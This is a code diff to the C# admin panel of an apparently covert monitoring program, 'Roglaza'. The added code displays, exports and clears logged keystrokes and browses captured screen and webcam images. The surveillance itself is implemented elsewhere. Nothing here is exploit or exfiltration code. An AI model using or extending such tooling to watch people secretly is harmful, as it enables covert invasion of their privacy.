@@ -85,7 +85,7 @@ namespace Roglaza.Forms
 
         private void FrmAdminPanel_Load(object sender, EventArgs e)
         {
-
+            comboBox_capture_device.SelectedIndex = 0;
 
             labelBannerHidden.Text = MessageStrings.ImHidden;
             label_Banner.Text = AppInfo.AppBanner;
@@ -118,6 +118,13 @@ namespace Roglaza.Forms
             LoadMatches();
             button_save.Visible = false;
 
+            LoadStoredKeystrokes();
+        }
+
+        private void LoadStoredKeystrokes()
+        {
+            label_keystrokes_path.Text = Program.ProgramSettings.KeyLoggerStorePath;
+            richTextBox_keystrokes_viewer.Text = RoglazaHelper.ReadTextFile(label_keystrokes_path.Text);
         }
 
         private void LoadMatches()
@@ -252,8 +259,9 @@ namespace Roglaza.Forms
         {
 
             if (FormLoaded)
-                Program.ProgramSettings.AllowKeyLogger = checkBoxKeyLogger.Checked;
+                Program.ProgramSettings.AllowKeyLogger = panel_Logs_control.Enabled=checkBoxKeyLogger.Checked;
             Program.ProgramSettings.SaveSettings();
+
         }
 
         private void checkBoxBrowserHistory_CheckedChanged(object sender, EventArgs e)
@@ -493,6 +501,157 @@ namespace Roglaza.Forms
         private void textBox_New_match_TextChanged(object sender, EventArgs e)
         {
             button_add_new_match.Enabled = textBox_New_match.Text.Trim().Length > 2;
+        }
+
+        private void timer_global_Tick(object sender, EventArgs e)
+        {
+            LoadStoredKeystrokes();
+        }
+
+        private void button1_Clear_keystrokes__Click(object sender, EventArgs e)
+        {
+            RoglazaHelper.FileWriteText(Program.ProgramSettings.KeyLoggerStorePath, "");
+            richTextBox_keystrokes_viewer.Text = RoglazaHelper.ReadTextFile(Program.ProgramSettings.KeyLoggerStorePath);
+        }
+
+        private void button_export_Click(object sender, EventArgs e)
+        {
+            SaveFileDialog s = new SaveFileDialog();
+            s.FileName = "Logs.txt";
+            if (s.ShowDialog() == DialogResult.OK)
+            {
+                if (RoglazaHelper.FileWriteText(s.FileName, richTextBox_keystrokes_viewer.Text))
+                    MessageBox.Show("success");
+            }
+        }
+
+        private void comboBox_capture_device_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            OrganizeCaptureView();
+        }
+
+        private void OrganizeCaptureView()
+        {
+            comboBox_capture_day.Items.Clear();
+            comboBox_capture_day.DisplayMember = "Text";
+            comboBox_capture_day.ValueMember = "Value";
+
+            string logsPath = Program.ProgramSettings.LogsPath+"\\"+(comboBox_capture_device.SelectedIndex==0?"Screens":"Cams");
+            string[] dirs = RoglazaHelper.GetDirectories(logsPath);
+            if (dirs == null)
+                return;
+            if (dirs.Length < 1)
+                return;
+            foreach (string s in dirs)
+            {
+                var ir = new CMBX_Item(RoglazaHelper.ReturnLastSplit(s, '\\'), s);
+                comboBox_capture_day.Items.Add(ir);
+            }
+            if (comboBox_capture_day.Items.Count > 0)
+                comboBox_capture_day.SelectedIndex = 0;
+            
+        }
+
+        private void comboBox_capture_day_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (comboBox_capture_day.SelectedIndex < 0)
+                return;
+
+            comboBox_Capture_hour.Items.Clear();
+            comboBox_Capture_hour.DisplayMember = "Text";
+            comboBox_Capture_hour.ValueMember = "Value";
+            
+            string logsPath =  ((CMBX_Item)comboBox_capture_day.SelectedItem).Value;
+            string[] dirs = RoglazaHelper.GetDirectories(logsPath);
+            if (dirs == null)
+                return;
+            if (dirs.Length < 1)
+                return;
+            foreach (string s in dirs)
+            {
+                var ir = new CMBX_Item(RoglazaHelper.ReturnLastSplit(s, '\\'), s);
+                comboBox_Capture_hour.Items.Add(ir);
+            }
+            if (comboBox_Capture_hour.Items.Count > 0)
+                comboBox_Capture_hour.SelectedIndex = 0;
+
+
+        }
+
+        private void comboBox_Capture_hour_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            if (comboBox_capture_day.SelectedIndex < 0)
+                return;
+            comboBox_file.Items.Clear();
+            comboBox_file.DisplayMember = "Text";
+            comboBox_file.ValueMember = "Value";
+
+            string logsPath = ((CMBX_Item)comboBox_Capture_hour.SelectedItem).Value;
+            string[] dirs = RoglazaHelper.GetFiles(logsPath);
+            if (dirs == null)
+                return;
+            if (dirs.Length < 1)
+                return;
+            foreach (string s in dirs)
+            {
+                var ir = new CMBX_Item(RoglazaHelper.ReturnLastSplit(s, '\\'), s);
+                comboBox_file.Items.Add(ir);
+            }
+            if (comboBox_file.Items.Count > 0)
+                comboBox_file.SelectedIndex = 0;
+        }
+
+        private void comboBox_file_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            try
+            {
+                var r =(CMBX_Item)comboBox_file.SelectedItem;
+                pictureBox_Capture_Viewer.Image=Image.FromFile(r.Value);
+                pictureBox_Capture_Viewer.Tag = r.Value;
+                label_images_counter.Text = (comboBox_file.SelectedIndex + 1).ToString();
+                button_NextImage.Visible = comboBox_file.SelectedIndex < comboBox_file.Items.Count - 1;
+                button_Prev_image.Visible = comboBox_file.SelectedIndex > 0;
+            }
+            catch
+            {
+            }
+        }
+
+        private void button_NextImage_Click(object sender, EventArgs e)
+        {
+            int i = comboBox_file.SelectedIndex + 1;
+            if (comboBox_file.Items.Count <= i)
+                i = 0;
+            comboBox_file.SelectedIndex = i;
+        }
+
+        private void button_Prev_image_Click(object sender, EventArgs e)
+        {
+            int i = comboBox_file.SelectedIndex - 1;
+            if (i <= 0)
+               i= comboBox_file.Items.Count-1;
+            comboBox_file.SelectedIndex = i;
+        }
+
+        private void pictureBox_Capture_Viewer_Click(object sender, EventArgs e)
+        {
+            if (pictureBox_Capture_Viewer.Tag == null)
+                return;
+            if (RoglazaHelper.IsExistedFile(pictureBox_Capture_Viewer.Tag.ToString()) == false)
+                return;
+            ImagePreviewer p = new ImagePreviewer();
+            p.Icon = this.Icon;
+            p.Imagepath = pictureBox_Capture_Viewer.Tag.ToString();
+            p.ShowDialog();
+        }
+
+        private void button_setPassword_Click(object sender, EventArgs e)
+        {
+            if (MessageBox.Show(MessageStrings.AreYouSureToChangePass, "Warning", MessageBoxButtons.YesNo, MessageBoxIcon.Information) == DialogResult.Yes)
+            {
+                Program.ProgramSettings.SetNewPassword(textBox_new_password.Text);
+                MessageBox.Show("Success");
+            }
         }
     }
     //Refernce
